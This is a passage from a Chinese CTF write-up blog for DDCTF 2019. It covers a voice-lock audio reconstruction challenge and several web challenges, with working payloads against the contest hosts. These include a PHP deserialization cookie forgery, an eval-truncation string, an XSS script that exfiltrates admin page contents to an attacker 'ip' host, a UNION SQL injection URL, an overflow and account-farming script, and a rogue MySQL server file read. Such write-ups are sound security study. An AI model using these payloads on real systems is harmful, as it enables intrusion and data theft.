+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 3.6</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cmath</span><br><span class="line"><span class="keyword">import</span> librosa <span class="comment"># v0.6.2, maybe ffmpeg is needed as backend</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># v1.15.4</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="comment"># Pillow v5.4.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version[<span class="number">0</span>] == <span class="string">'3'</span>:</span><br><span class="line">    xrange = range</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_range_wrapper</span><span class="params">(*args)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> list(xrange(*args))</span><br><span class="line">    range = _range_wrapper</span><br><span class="line"></span><br><span class="line">window_size = <span class="number">2048</span></span><br><span class="line">step_size = <span class="number">100</span></span><br><span class="line">max_lim = <span class="number">0.15</span></span><br><span class="line">f_ubound = <span class="number">2000</span></span><br><span class="line">f_bins = <span class="number">150</span></span><br><span class="line">sr = <span class="number">15000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform_x</span><span class="params">(x, f_ubound=f_ubound, f_bins=f_bins)</span>:</span></span><br><span class="line">    freqs = np.logspace(np.log10(<span class="number">20</span>), np.log10(f_ubound), f_bins)</span><br><span class="line">    seqs = []</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> freqs:</span><br><span class="line">        seq = []</span><br><span class="line">        d = cmath.exp(<span class="number">-2j</span> * cmath.pi * f / sr)</span><br><span class="line">        coeff = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> xrange(len(x)):</span><br><span class="line">            seq.append(x[t] * coeff)</span><br><span class="line">            coeff *= d</span><br><span class="line">        seqs.append(seq)</span><br><span class="line">    sums = []</span><br><span class="line">    <span class="keyword">for</span> seq <span class="keyword">in</span> seqs:</span><br><span class="line">        X = [sum(seq[:window_size])/window_size]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> xrange(step_size, len(x), step_size):</span><br><span class="line">            X.append(X[<span class="number">-1</span>]-sum(seq[t-step_size:t])/window_size)</span><br><span class="line">            <span class="keyword">if</span> t+window_size-step_size &lt; len(x): X[<span class="number">-1</span>] += sum(seq[t+window_size-step_size:t+window_size])/window_size</span><br><span class="line">        sums.append(X)</span><br><span class="line">    <span class="keyword">return</span> freqs, np.array(sums)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_diff</span><span class="params">(x, spec)</span>:</span></span><br><span class="line">    f, x = transform_x(x)</span><br><span class="line">    <span class="keyword">if</span> x.shape != spec.shape: <span class="keyword">return</span> <span class="number">999</span></span><br><span class="line">    diff = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(x.shape[<span class="number">0</span>]):</span><br><span class="line">        xx = np.abs(x[i])</span><br><span class="line">        xx = np.round(linear_map(xx, np.min(xx), np.max(xx), <span class="number">0</span>, <span class="number">255</span>)).astype(np.uint8)</span><br><span class="line">        sp = np.abs(spec[i])</span><br><span class="line">        sp = np.round(linear_map(sp, np.min(sp), np.max(sp), <span class="number">0</span>, <span class="number">255</span>)).astype(np.uint8)</span><br><span class="line">        diff += np.linalg.norm(xx-sp)</span><br><span class="line">    <span class="keyword">return</span> diff/x.shape[<span class="number">0</span>]/x.shape[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_map</span><span class="params">(v, old_dbound, old_ubound, new_dbound, new_ubound)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (v-old_dbound)*<span class="number">1.0</span>/(old_ubound-old_dbound)*(new_ubound-new_dbound) + new_dbound</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image_to_array</span><span class="params">(img)</span>:</span></span><br><span class="line">    img_arr = linear_map(np.array(img.getdata(), np.uint8).reshape(img.size[<span class="number">1</span>], img.size[<span class="number">0</span>], <span class="number">3</span>), <span class="number">0</span>, <span class="number">255</span>, -max_lim, max_lim)</span><br><span class="line">    <span class="keyword">return</span> img_arr[:, :, <span class="number">1</span>] + img_arr[:, :, <span class="number">2</span>] * <span class="number">1j</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'usage: python3 voice_lock.py &lt;path_to_your_voice.wav&gt;'</span>)</span><br><span class="line">        exit()</span><br><span class="line">    data, sr = librosa.load(sys.argv[<span class="number">1</span>], sr=sr)</span><br><span class="line">    C_fingerprint = image_to_array(Image.open(<span class="string">'fingerprint.png'</span>))</span><br><span class="line">    print(<span class="string">'please wait...'</span>)</span><br><span class="line">    sqr_diff = calc_diff(data, C_fingerprint)</span><br><span class="line">    print(<span class="string">'sqr diff ='</span>, sqr_diff)</span><br><span class="line">    <span class="keyword">if</span> sqr_diff &lt; <span class="number">3.0</span>:</span><br><span class="line">        print(<span class="string">'access granted, congratulations!'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'access denied'</span>)</span><br></pre></td></tr></table></figure>
+<p>大致流程，从图片中获取隐藏的数据，对应到<code>-max_lim-max_lim</code>域而后与短时傅里叶变换后的音频数据进行比较，整体求范数，最后&lt;3.0则通过验证<br>傅里叶变换后的数据可以直接通过<code>image_to_array</code>可以拿到，我们需要对数据求逆获得原始音频数据而后利用<code>librosa.output.write_wav</code>保存输出，首先想到的是librosa原生求短时傅里叶函数istft，设置好<code>hop_length</code>,window和窗口大小<code>win_length</code>,求出数据保存，失败了，猜测是窗口函数或者题目实现的原因，自己写逆函数对每组数据windows进行逆傅里叶变换(我也不知道这样理解对不对，and有木有可以直接用原生解的方法？？)：</p>
+<p><img src="/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749685750.webp" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cmath</span><br><span class="line"><span class="keyword">import</span> librosa <span class="comment"># v0.6.2, maybe ffmpeg is needed as backend</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># v1.15.4</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="comment"># Pillow v5.4.1</span></span><br><span class="line"><span class="keyword">import</span> code</span><br><span class="line">window_size = <span class="number">2048</span></span><br><span class="line">step_size = <span class="number">100</span></span><br><span class="line">max_lim = <span class="number">0.15</span></span><br><span class="line">f_ubound = <span class="number">2000</span></span><br><span class="line">f_bins = <span class="number">150</span></span><br><span class="line">sr = <span class="number">15000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_map</span><span class="params">(v, old_dbound, old_ubound, new_dbound, new_ubound)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (v-old_dbound)*<span class="number">1.0</span>/(old_ubound-old_dbound)*(new_ubound-new_dbound) + new_dbound</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image_to_array</span><span class="params">(img)</span>:</span></span><br><span class="line">    img_arr = linear_map(np.array(img.getdata(), np.uint8).reshape(img.size[<span class="number">1</span>], img.size[<span class="number">0</span>], <span class="number">3</span>), <span class="number">0</span>, <span class="number">255</span>, -max_lim, max_lim)</span><br><span class="line">    <span class="keyword">return</span> img_arr[:, :, <span class="number">1</span>] + img_arr[:, :, <span class="number">2</span>] * <span class="number">1j</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    C_fingerprint = image_to_array(Image.open(<span class="string">'fingerprint.png'</span>))</span><br><span class="line">    freqs = np.logspace(np.log10(<span class="number">20</span>), np.log10(<span class="number">2000</span>), <span class="number">150</span>)</span><br><span class="line">    data=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">987</span>):</span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">              final_num=<span class="number">0</span></span><br><span class="line">              <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">150</span>):</span><br><span class="line">                   tmp=i*<span class="number">100</span>+j</span><br><span class="line">                   tmp2=C_fingerprint[k][i]</span><br><span class="line">                   tmp3=cmath.exp(<span class="number">2j</span>*cmath.pi*tmp*freqs[k]/<span class="number">15000</span>)<span class="comment">#</span></span><br><span class="line">                   final_num+=tmp2*tmp3</span><br><span class="line">              data.append(final_num)</span><br><span class="line">    data = np.array(data).astype(np.float32)<span class="comment">#something wrong??</span></span><br><span class="line">    librosa.output.write_wav(<span class="string">'kirin.wav'</span>, data,sr=<span class="number">17000</span>)</span><br></pre></td></tr></table></figure>
+<p>音频大致听出有字母，提交主办方后通过。</p>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h4><p>观察jpg参数发现：其是文件名hex编码后+两次base64，因此想到存在任意文件读，读到<code>index.php</code>，发现无法绕过，文件开头存在一个url，打开是个博客。</p>
+<p>在其他文章看一下，发现vim退出产生swp那一篇，发现了practice.txt.swp(坑)。</p>
+<p>然后就常规变量覆盖，uid=&amp;k=，拿到了flag</p>
+<h4 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h4><p>包里传入didictf_username那个头，拿到源码。</p>
+<p>审计一下思路很清晰，sprintf的格式化字符串拿到泄露的key，然后构造反序列化，析构时读文件，exp：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class Application &#123;</span><br><span class="line">    var $path = <span class="string">'....//config/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$userdata = array(</span><br><span class="line">    'session_id' =&gt; 'sessionid',</span><br><span class="line">    'ip_address' =&gt; 'ip',</span><br><span class="line">    'user_agent' =&gt; '',</span><br><span class="line">    'user_data' =&gt; new Application(),</span><br><span class="line">);</span><br><span class="line">$cookiedata = serialize($userdata);</span><br><span class="line">$cookiedata = urlencode($cookiedata) . md5(<span class="string">'EzblrbNS'</span> . $cookiedata);</span><br><span class="line">echo $cookiedata;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h4><p>试了几个方法无法绕过，猜测后端应该是进行了GD二次渲染。参考文章:<br><code>https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg</code><br>生成一张图片，只要像他说的，把payload放在scan header块之后即可，传上去再下载，就免去看lib版本的问题，再传上去，回显即得到flag。</p>
+<h4 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h4><p>审计，存在直接get_flag方法但是禁用，流程核心在trigger_event方法，在execute_event_loop方法里有eval，果断尝试%23，成功截断</p>
+<p>最后利用截断来调用trigger_event执行buy_handler两次，即可将flag返回到session中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event%<span class="number">23</span>;action:buy;<span class="number">1</span>%<span class="number">23</span>action:buy;<span class="number">1</span>%<span class="number">23</span>action:get_flag;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>拿到session，b64解不开，在github搜到一个解密脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sql3t0/shellterlabsCTF/blob/a956831690132b3e9b48439424f8bfe52be088c1/tools/session_cookie_manager_flask.py</span><br></pre></td></tr></table></figure>
+<p>直接decode再解base64即可看到flag：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<h4 id="欢迎报名DDCTF"><a href="#欢迎报名DDCTF" class="headerlink" title="欢迎报名DDCTF"></a>欢迎报名DDCTF</h4><p>备注处xss，img发现能发出请求，网上找到一段读html的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script src=&apos;http://your_ip/1.js&apos;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://ip/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;http://117.51.147.2/Ze02pQYLf5gGNyMn/admin.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
+<p>找到了接口位置<br><code>&lt;a_target=&quot;_blank&quot;__href=&quot;query_aIeMu0FUoVrW0NWPHbN6z4xh.php&quot;&gt;</code><br>id参数，尝试注入，sleep和bool都不行，题目环境比较乱，最后union直接出结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=-1%aa%27or%201%20union%20select%201,ctf_value,3,4,5%20from%20ctfdb.ctf_fhmHRPL5%23</span><br></pre></td></tr></table></figure>
+<h4 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡~"></a>大吉大利，今晚吃鸡~</h4><p>注册进去，购买功能无法直接购买(余额不足)，猜测又是逻辑或溢出或多线程。<br>尝试发现价格为2^32时存在溢出，无需余额支付就能购买，这样便一边申请账号购买，一边开一个账号刷入即可，不知道是不是我脚本问题，到最后返回json成功也不能降低，返回json存在data时才会减少，虽然后期减少的慢，不过一直跑着脚本，最后成功：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ans=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000</span>,<span class="number">5100</span>):</span><br><span class="line">    url=<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=kirin%sa&amp;password=12345678"</span> %i</span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    url=<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=kirin%sa&amp;password=12345678"</span> %i</span><br><span class="line">    <span class="keyword">print</span> url</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    cookie=r.headers[<span class="string">'Set-Cookie'</span>].replace(<span class="string">" Path=/, "</span>,<span class="string">""</span>).replace(<span class="string">"; Path=/"</span>,<span class="string">""</span>)</span><br><span class="line">    header=&#123;</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"117.51.147.155:5050"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv\":6\"6.0) Gecko/20100101 Firefox/66.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>:cookie,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line">    url2=<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span></span><br><span class="line">    <span class="keyword">print</span> url2</span><br><span class="line">    r2=requests.get(url2,headers=header)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    bill_id=r2.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">    url3=<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span> %bill_id</span><br><span class="line">    <span class="keyword">print</span> url3</span><br><span class="line">    r3=requests.get(url3,headers=header)</span><br><span class="line">    l=r3.json()[<span class="string">'data'</span>][<span class="number">0</span>]</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    header=&#123;</span><br><span class="line">      <span class="string">"Host"</span>: <span class="string">"117.51.147.155:5050"</span>,</span><br><span class="line">      <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv\":6\"6.0) Gecko/20100101 Firefox/66.0"</span>,</span><br><span class="line">      <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">      <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">      <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">      <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">      <span class="string">'Cookie'</span>:<span class="string">'user_name=kir; REVEL_SESSION=702e139613872d0e2a5278f03345bae4'</span>,</span><br><span class="line">      <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line">    url=<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span> %(str(l[<span class="string">'your_id'</span>]),l[<span class="string">'your_ticket'</span>])</span><br><span class="line">    <span class="keyword">print</span> url</span><br><span class="line">    r=requests.get(url,headers=header)</span><br><span class="line">    <span class="keyword">print</span> r.json()</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h4><p>提供了一个接口和文件，文件运行在服务器，接口用于访问服务器上的mysql，想到mysql的一个连接漏洞：<code>https://github.com/allyshka/Rogue-MySql-Server</code><br>但是运行后无法收到请求，提示没有mysql服务，重新观察agent.py,看到判断服务过程：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_func</span><span class="params">(self)</span>:</span></span><br><span class="line">        netstat = Popen([<span class="string">'netstat'</span>, <span class="string">'-tlnp'</span>], stdout=PIPE)</span><br><span class="line">        netstat.wait()</span><br><span class="line"></span><br><span class="line">        ps_list = netstat.stdout.readlines()</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> ps_list[<span class="number">2</span>:]:</span><br><span class="line">            tmp = item.split()</span><br><span class="line">            Local_Address = tmp[<span class="number">3</span>]</span><br><span class="line">            Process_name = tmp[<span class="number">6</span>]</span><br><span class="line">            tmp_dic = &#123;<span class="string">'local_address'</span>: Local_Address, <span class="string">'Process_name'</span>: Process_name&#125;</span><br><span class="line">            result.append(tmp_dic)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+<p>这时候我们result.append(‘mysqld’)，此时再次在服务器伪造server，发现成功连接，并造成任意文件读。<br>在<code>/root/.bash_history</code>下发现<code>/home/dc2-user/ctf_web_2/app/main/views.py</code><br>看到提示:</p>
+<p><code># flag in mysql curl@localhost database:security table:flag</code><br>各种读之后，想到可以直接读库文件：<code>/var/lib/mysql/security/flag.idb</code>拿到flag</p>
+
+      
+    </div>
+    
+    
+    
+	
+	
+	
+    
+    
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #a3a3a3;font-size:20px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>如有疑问或需要技术讨论，请发邮件到 zlem0n@foxmail.com</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="https://wx2.sinaimg.cn/small/d3ea225bly1g287wga5mwj2076076mxd.jpg" alt="lem0n 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="https://wx2.sinaimg.cn/small/d3ea225bly1g287wcaboej207r07rmxa.jpg" alt="lem0n 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lem0n
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://alem0n.github.io/2019/04/08/记录一些ctf杂项-2019/" title="记录一些ctf杂项思路">https://alem0n.github.io/2019/04/08/记录一些ctf杂项-2019/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/08/解决pycharm问题：module 'pip' has no attribute 'main'-2019/" rel="next" title="解决pycharm问题：module 'pip' has no attribute 'main'">
+                <i class="fa fa-chevron-left"></i> 解决pycharm问题：module 'pip' has no attribute 'main'
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/20/解决BT5下pcaprub的问题-2019/" rel="prev" title="记录一些ctf杂项思路">
+                记录一些ctf杂项思路 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://wx3.sinaimg.cn/small/d3ea225bly1g287w8pdezj205c05cdg1.jpg" alt="lem0n">
+            
+              <p class="site-author-name" itemprop="name">lem0n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+			<!--my custom code begin-->
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.5.0/velocity.min.js"></script>
+			<script type="text/javascript">
+			  $("#sidebar").hover(function(){
+				$("#mydivshow").velocity('stop').velocity({opacity: 1});
+			  },function(){
+				$("#mydivshow").velocity('stop').velocity({opacity: 0});
+			  });
+			</script>
+			<div id="mydivshow" class="mydivshow">
+			<!--my custom code end-->
+			
+          <nav class="site-state motion-element">
+
